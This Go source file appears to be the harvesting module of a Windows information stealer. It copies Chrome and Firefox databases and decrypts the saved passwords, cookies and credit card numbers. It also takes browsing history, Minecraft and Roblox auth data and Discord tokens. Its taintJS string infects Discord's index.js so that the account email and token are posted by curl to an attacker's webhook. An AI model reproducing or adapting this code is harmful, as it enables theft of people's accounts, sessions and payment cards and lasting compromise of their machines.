package parse

import (
	"bytes"
	"database/sql"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"regexp"

	"github.com/equisde/Clean/core"
	"github.com/equisde/Clean/core/decrypt"
	"github.com/equisde/Clean/utils"
	"golang.org/x/sys/windows/registry"
)

func getCookies(browserData []string) bool {

	var (
		tempBrowserPath = utils.CleanPath(filepath.Join(tempPath, browserData[1]+"Cookies.data"))
	)

	if !utils.CopyFile(tempBrowserPath, filepath.Join(browserData[0], "Cookies")) {
		return false
	}

	cookieDB, err := sql.Open("sqlite3", tempBrowserPath)
	if err != nil {
		return false
	}

	rows, err := cookieDB.Query(`SELECT name, encrypted_value, host_key, path FROM cookies`)
	if err != nil {
		return false
	}

	for rows.Next() {
		var (
			name, host, path string
			encryptedValue   []byte
			value            []byte
		)
		if err = rows.Scan(&name, &encryptedValue, &host, &path); err != nil {
			continue
		}

		tempCookie := core.CookieStruct{
			Browser:        browserData[1],
			Name:           name,
			Host:           host,
			Path:           path,
			EncryptedValue: encryptedValue,
		}

		switch MasterKey {
		case nil:
			value, err = decrypt.Decrypt(encryptedValue)
			if err != nil {
				continue
			}
		default:
			value, err = decrypt.ChromeDecrypt(encryptedValue, MasterKey)
			if err != nil {
				continue
			}
		}

		tempCookie.Value = string(value)

		LoggedCookies.Logged = append(LoggedCookies.Logged, tempCookie)
	}
	cookieDB.Close()
	rows.Close()
	core.HandleErr(os.Remove(tempBrowserPath))

	return getCreditCards(browserData)
}

func getFireFoxCookies(browserData []string) bool {
	var (
		tempBrowserPath = utils.CleanPath(filepath.Join(tempPath, browserData[1]+"Cookies.data"))
	)

	if !utils.CopyFile(tempBrowserPath, filepath.Join(browserData[0], "cookies.sqlite")) {
		return false
	}

	cookieDB, err := sql.Open("sqlite3", tempBrowserPath)
	if err != nil {
		return false
	}

	rows, err := cookieDB.Query("SELECT name, value, host, path FROM moz_cookies")
	if err != nil {
		return false
	}

	for rows.Next() {
		var (
			name, value, host, path string
		)

		if err = rows.Scan(&name, &value, &host, &path); err != nil {
			continue
		}

		tempCookie := core.CookieStruct{
			Browser: browserData[1],
			Name:    name,
			Host:    host,
			Path:    path,
			Value:   value,
		}

		LoggedCookies.Logged = append(LoggedCookies.Logged, tempCookie)
	}
	cookieDB.Close()
	rows.Close()
	core.HandleErr(os.Remove(tempBrowserPath))

	return getFireFoxHistory(browserData)
}

func getCreditCards(browserData []string) bool {
	var (
		tempBrowserPath = utils.CleanPath(filepath.Join(tempPath, browserData[1]+"CreditCards.data"))
	)

	if !utils.CopyFile(tempBrowserPath, filepath.Join(browserData[0], "Web Data")) {
		return false
	}

	creditDB, err := sql.Open("sqlite3", tempBrowserPath)
	if err != nil {
		return false
	}

	rows, err := creditDB.Query("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
	if err != nil {
		return false
	}

	for rows.Next() {
		var (
			name, month, year         string
			encryptValue, plainNumber []byte
		)

		if err = rows.Scan(&name, &month, &year, &encryptValue); err != nil {
			continue
		}

		switch MasterKey {
		case nil:
			plainNumber, err = decrypt.Decrypt(encryptValue)
			if err != nil {
				continue
			}
		default:
			plainNumber, err = decrypt.ChromeDecrypt(encryptValue, MasterKey)
			if err != nil {
				continue
			}
		}

		tempStruct := core.CardStruct{
			Browser:         browserData[1],
			Name:            name,
			ExpirationMonth: month,
			ExpirationYear:  year,
			Value:           string(plainNumber),
		}

		LoggedCards.Logged = append(LoggedCards.Logged, tempStruct)
	}
	creditDB.Close()
	rows.Close()

	core.HandleErr(os.Remove(tempBrowserPath))

	return getHistory(browserData)
}

func getHistory(browserData []string) bool {
	var (
		tempBrowserPath = utils.CleanPath(filepath.Join(tempPath, browserData[1]+"History.data"))
	)

	if !utils.CopyFile(tempBrowserPath, filepath.Join(browserData[0], "History")) {
		return false
	}

	historyDB, err := sql.Open("sqlite3", tempBrowserPath)
	if err != nil {
		return false
	}

	rows, err := historyDB.Query(`SELECT url, title, visit_count, last_visit_time FROM urls`)
	if err != nil {
		return false
	}

	for rows.Next() {
		var (
			url, title    string
			visitCount    int
			lastVisitTime int64
		)

		if err := rows.Scan(&url, &title, &visitCount, &lastVisitTime); err != nil {
			continue
		}

		tempStruct := core.HistoryStruct{
			Browser:    browserData[1],
			Title:      title,
			Url:        url,
			VisitCount: visitCount,
			LastVisit:  utils.Epoch(lastVisitTime),
		}

		LoggedHistory.Logged = append(LoggedHistory.Logged, tempStruct)
	}
	historyDB.Close()
	rows.Close()

	core.HandleErr(os.Remove(tempBrowserPath))

	return true
}

func getFireFoxHistory(browserData []string) bool {
	var (
		tempBrowserPath = utils.CleanPath(filepath.Join(tempPath, browserData[1]+"History.data"))
	)

	if !utils.CopyFile(tempBrowserPath, filepath.Join(browserData[0], "History")) {
		return false
	}

	historyDB, err := sql.Open("sqlite3", tempBrowserPath)
	if err != nil {
		return false
	}

	rows, err := historyDB.Query(`SELECT id, url, last_visit_date, title, visit_count FROM moz_places`)
	if err != nil {
		return false
	}

	for rows.Next() {
		var (
			url, title    string
			visitCount    int
			lastVisitTime int64
		)

		if err := rows.Scan(&url, &lastVisitTime, title, &visitCount); err != nil {
			continue
		}

		tempStruct := core.HistoryStruct{
			Browser:    browserData[1],
			Title:      title,
			Url:        url,
			VisitCount: visitCount,
			LastVisit:  utils.Epoch(lastVisitTime / 1000000),
		}

		LoggedHistory.Logged = append(LoggedHistory.Logged, tempStruct)
	}

	historyDB.Close()
	rows.Close()

	core.HandleErr(os.Remove(tempBrowserPath))

	return true
}

func GetLogins(browserData []string) bool {
	if !utils.CheckFileExist(tempPath) {
		core.HandleErr(os.Mkdir(tempPath, 0700))
	}

	var (
		loginPath       = filepath.Join(browserData[0], "Login Data")
		tempBrowserPath = utils.CleanPath(filepath.Join(tempPath, browserData[1]+".data"))
	)

	if !utils.CopyFile(tempBrowserPath, loginPath) {
		return false
	}

	db, err := sql.Open("sqlite3", tempBrowserPath)
	core.HandleErr(err)

	dbRows, err := db.Query("select origin_url, username_value, password_value from logins")
	core.HandleErr(err)

	for dbRows.Next() {
		var (
			plainPass                 []byte
			url_value, username_value string
			password_value            []byte
		)

		err = dbRows.Scan(&url_value, &username_value, &password_value)
		core.HandleErr(err)

		switch MasterKey {
		case nil:
			plainPass, err = decrypt.Decrypt(password_value)
			if err != nil {
				continue
			}
		default:
			plainPass, err = decrypt.ChromeDecrypt(password_value, MasterKey)
			if err != nil {
				continue
			}
		}

		loginData := core.LoginStruct{
			Browser:  browserData[1],
			Url:      url_value,
			Username: username_value,
			Password: string(plainPass),
		}

		Logins.Logged = append(Logins.Logged, loginData)
	}
	db.Close()
	dbRows.Close()

	core.HandleErr(os.Remove(tempBrowserPath))

	return getCookies(browserData)
}

// Credits to https://github.com/moonD4rk/HackBrowserData for most of the FireFox stuff (and /core/decrypt/decrypt.go)

func GetFireFoxLogins(browserData []string) bool {
	if !utils.CheckFileExist(tempPath) {
		core.HandleErr(os.Mkdir(tempPath, 0700))
	}

	if !utils.CheckFileExist(browserData[0]) {
		return false
	}

	globalSalt, metaBytes, nssA11, nssA102, err := decrypt.GetFireFoxKey(browserData[0])
	if err != nil {
		return false
	}

	metaPBE, err := decrypt.NewASN1PBE(metaBytes)
	if err != nil {
		return false
	}

	var masterPwd []byte

	key, err := metaPBE.Decrypt(globalSalt, masterPwd)
	if err != nil {
		return false
	}

	if !bytes.Contains(key, []byte(`password-check`)) {
		return false
	}

	m := bytes.Compare(nssA102, []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
	if m != 0 {
		return false
	}

	nssPBE, err := decrypt.NewASN1PBE(nssA11)
	if err != nil {
		return false
	}

	trueKey, err := nssPBE.Decrypt(globalSalt, masterPwd)
	trueKey = trueKey[:24]
	if err != nil {
		return false
	}

	allLogins, err := decrypt.GetFireFoxLoginData(browserData[0])
	if err != nil {
		return false
	}

	for _, login := range allLogins {
		userPBE, err := decrypt.NewASN1PBE(login.EncryptUser)
		core.HandleErr(err)

		pwdPBE, err := decrypt.NewASN1PBE(login.EncryptPass)
		core.HandleErr(err)

		user, err := userPBE.Decrypt(trueKey, masterPwd)
		core.HandleErr(err)

		pwd, err := pwdPBE.Decrypt(trueKey, masterPwd)
		core.HandleErr(err)

		loginData := core.LoginStruct{
			Browser:  browserData[1],
			Url:      login.Url,
			Username: string(decrypt.PKCS5UnPadding(user)),
			Password: string(decrypt.PKCS5UnPadding(pwd)),
		}

		Logins.Logged = append(Logins.Logged, loginData)
	}

	return getFireFoxCookies(browserData)
}

func GetMinecraftAuths() bool {
	if utils.CheckFileExist(utils.CleanPath(filepath.Join(userProfile, "/AppData/Roaming/.minecraft/launcher_profiles.json"))) {
		if os.Mkdir(utils.CleanPath(filepath.Join(tempPath, "Minecraft")), 0777) != nil {
			return false
		}
	}

	if !utils.CopyFile(utils.CleanPath(filepath.Join(tempPath, "Minecraft", "launcher_profiles.json")), utils.CleanPath(filepath.Join(userProfile, "/AppData/Roaming/.minecraft/launcher_profiles.json"))) {
		return false
	}

	return true
}

func GetRobloxAuth() bool {
	registryKey, err := registry.OpenKey(registry.CURRENT_USER, `Software\Roblox\RobloxStudioBrowser\roblox.com`, registry.QUERY_VALUE)
	if err != nil {
		return false
	}
	defer registryKey.Close()

	keyEntry, _, err := registryKey.GetStringValue(".ROBLOSECURITY")
	if err != nil || len(keyEntry) == 0 {
		return false
	}

	tempCookie := core.CookieStruct{
		Browser: "Roblox-Studio",
		Name:    ".ROBLOSECURITY",
		Host:    "https://roblox.com",
		Path:    "/login",
		Value:   keyEntry[46 : len(keyEntry)-1],
	}
	LoggedCookies.Logged = append(LoggedCookies.Logged, tempCookie)

	return true
}

func GetTokens(path, infectPath, webhookURL string) {
	path = userProfile + path
	if len(infectPath) != 0 {
		infectFile, err := filepath.Glob(fmt.Sprintf("%s\\modules\\discord_modules-*\\discord_modules\\index.js", userProfile+infectPath))
		if err == nil && len(infectFile) > 0 {
			readFile, err := ioutil.ReadFile(infectFile[0])
			if err == nil {
				var fileData = string(readFile)
				fileData = fileData + fmt.Sprintf(taintJS, webhookURL)

				ioutil.WriteFile(infectFile[0], []byte(fileData), 0777)
			} // god this is so ugly lmao
		}
		return
	}

	if _, err := os.Stat(path); err != nil {
		return
	}

	files, err := ioutil.ReadDir(path)
	if err != nil {
		return
	}

	for _, file := range files {
		bytes, err := ioutil.ReadFile(utils.CleanPath(filepath.Join(path, file.Name())))
		if err != nil {
			continue
		}

		tokensFound := tokenRegex.FindAllString(string(bytes), -1)
		for _, token := range tokensFound {
			if _, ok := LoggedTokens[token]; ok {
				continue
			}

			res := utils.HttpRequest("GET", "https://discord.com/api/v8/users/@me", nil, map[string]string{
				"Authorization": token,
			})
			if res.StatusCode != 200 {
				continue
			}

			var tempStruct = &core.UserStruct{}
			json.Unmarshal(utils.ReadBody(res), &tempStruct)

			LoggedTokens[token] = append(LoggedTokens[token], tempStruct)
		}
	}
}

var (
	LoggedCards   = &core.LoggedCards{}
	LoggedCookies = &core.LoggedCookies{}
	LoggedHistory = &core.LoggedHistory{}
	LoggedTokens  = map[string][]*core.UserStruct{}
	Logins        = &core.LoggedLogins{}
	MasterKey     []byte
	taintJS       = `var i = document.createElement('iframe');document.body.appendChild(i);require('child_process').exec('curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\\"content\\\": \\"Discord token logged on '+i.contentWindow.localStorage.email_cache+': '+i.contentWindow.localStorage.token.replace(/^"(.*)"$/, '$1')+'\\"}" %s',{ cwd: this.entityPath });`
	tempPath      = utils.CleanPath(filepath.Join(os.Getenv("TEMP"), "Results"))
	tokenRegex    = regexp.MustCompile(`[\w+]{24}\.[\w+]{6}\.[\w+]{27}|mfa\.[\w+]{84}`)
	userProfile   = os.Getenv("USERPROFILE")
)
